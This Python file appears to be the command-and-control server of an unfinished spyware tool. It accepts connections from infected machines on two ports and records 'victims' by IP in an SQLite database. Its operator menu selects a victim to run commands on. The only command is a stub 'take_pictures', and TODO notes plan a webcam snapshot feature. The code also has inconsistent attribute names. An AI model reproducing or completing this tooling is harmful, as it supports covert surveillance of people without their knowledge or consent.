
import socket
import threading
import sqlite3
import pickle
import time

# Local imports
from other_func import *

HOST = ''
CMD_PORT = 55555
DATA_PORT = 44444

# Todo: Change variable names to more relevant names
# Todo: Properly comment code
# Todo: Add a bulletproof file downloader
# Todo: Erase some scripts and bring them back to Spyware_Server.py
# Todo: Minimize imports, just what we need nothing else
# Todo: Add webcam_snap


class ChooseToAttack(object):

    def __init__(self):
        self.selected_user = {}
        self.users_online = {}
        self.online_size = len(self.users_online.keys())
        self.buffer = 1024

        self.switch = True  # How the change of the boolean value affect the script
        self.refresh_screen = True
        self.input_thread = True
        self.database = ManageDB()

    def get_connections(self):
        # Thread running here forever.
        while True:
            cmd_conn, addr = cmd_sock.accept()
            data_conn, _ = data_sock.accept()
            IP, PORT = addr[0], addr[1]

            db_output = self.database.find(IP)
            name = db_output[0] if db_output else random_name()

            if not db_output:
                self.database.insert(name, IP)

            elif name in self.users_online:
                # Prevents 2 connections from the same PC
                cmd_conn.close()
                data_conn.close()
                continue

            self.users_online[name] = [IP, PORT, cmd_conn, data_conn]
            thread = threading.Thread(target=self.check_connection, args=(name, self.users_online[name]))
            thread.start()

    def check_connection(self, name, user_data):
        # user_data => [IP, PORT, CMD_CONN, DATA_CONN]
        while True:
            try:
                if name not in self.selected_user:
                    online = user_data[2].recv(self.buffer)

                    if online:
                        pass
                    else:
                        raise ConnectionResetError
                pass

            except (ConnectionResetError, ConnectionAbortedError):
                if name in self.selected_user:
                    del self.selected_user[name]

                del self.users_online[name]
                break

    def pick_victim(self):
        while self.switch:

            if len(self.users_online.keys()) > self.online_size or self.refresh_sc:
                self.refresh_sc = False
                self.online_size = len(self.users_online.keys())

                clear_screen()
                print(ascii_logo)
                rename_desc = " - Type 'rename' to rename a victim!"
                select_desc = " - Type the name of the victim you want to select!"

                print(beautify(rename_desc, '=', 'top', len(select_desc)))
                print(beautify(select_desc, '=', 'bottom'), end='\n\n')

                for victim in self.users_online:
                    print(f" + {victim} + connected on \"{self.users_online[victim][0]}\"")

            elif self.input_thread:
                self.input_thread = False
                inp_thread = threading.Thread(target=self.get_input)
                inp_thread.start()

    def get_input(self):
        while self.switch:

            user_input = input('\n >>> ')

            if user_input in self.users_online.keys():
                self.selected_user[user_input] = self.users_online[user_input]
                self.switch = False

            elif user_input.lower() == 'rename':
                name = input("\n Type the name of the victim you wish to rename > ")

                if name in self.users_online.keys():
                    new_name = input(f"\n Type a new name for {name} > ")

                    if new_name and new_name != name:
                        self.database.update(new_name, name)
                        self.users_online[new_name] = self.users_online[name]
                        del self.users_online[name]
                    else:
                        invalid_inp()

                    self.refresh_sc = True
                else:
                    invalid_inp()
            else:
                self.refresh_sc = True
                time.sleep(0.5)


class ExecuteCMD(object):

    def __init__(self, victim_data):
        self.victim_data = victim_data
        self.switch = True
        self.input_thread = True
        self.refresh_screen = True

        self.run_cmd = {
            'take_pictures': ['Take (x) pictures every (y) seconds', self.take_pictures],
            'back': ['Go back to victim selection', self.back]}

    def pick_command(self):
        while self.switch:

            if self.refresh_screen:
                self.refresh_screen = False
                clear_screen()

                for cmd in self.run_cmd:
                    print(f"{cmd} = {self.run_cmd[cmd][0]}")

                if self.input_thread:
                    self.thread = False
                    inp_thread = threading.Thread(target=self.get_input)
                    inp_thread.start()

    def get_input(self):
        while self.switch:
            command = input("\n >>> ")

            if command in self.run_cmd:
                output = self.run_cmd[command][1]()

                if output == 'back':
                    self.switch = False

            self.clear_sc = True
            time.sleep(0.5)

    def take_pictures(self):
        pass

    def back(self):
        return 'back'


class ManageDB(object):

    def __init__(self):
        self.conn = sqlite3.connect("database.db", check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.create_table()

    def find(self, ip):
        self.cursor.execute("SELECT nickname FROM victims WHERE ip=?", (ip,))
        return self.cursor.fetchone()

    def insert(self, nick, ip):
        self.cursor.execute("INSERT INTO victims VALUES (?, ?)", (nick, ip))
        self.conn.commit()

    def update(self, new, old):
        self.cursor.execute("UPDATE victims SET nickname=? WHERE nickname=?", (new, old))
        self.conn.commit()

    def create_table(self):
        try:
            self.cursor.execute("""CREATE TABLE victims (nickname TEXT UNIQUE, ip TEXT UNIQUE)""")
            self.conn.commit()

        except sqlite3.OperationalError:
            # Table is already created!
            pass




if __name__ == '__main__':

    cmd_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    data_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cmd_sock.bind((HOST, CMD_PORT))
    data_sock.bind((HOST, DATA_PORT))

    cmd_sock.listen(5)
    data_sock.listen(5)

    to_attack = ChooseToAttack()
    listener = threading.Thread(target=to_attack.get_connections)
    listener.start()

    while True:
        to_attack.switch = True
        to_attack.input_thread = True
        to_attack.refresh_sc = True
        to_attack.pick_victim()

        execute = ExecuteCMD(to_attack.selected_user)
        execute.pick_command()

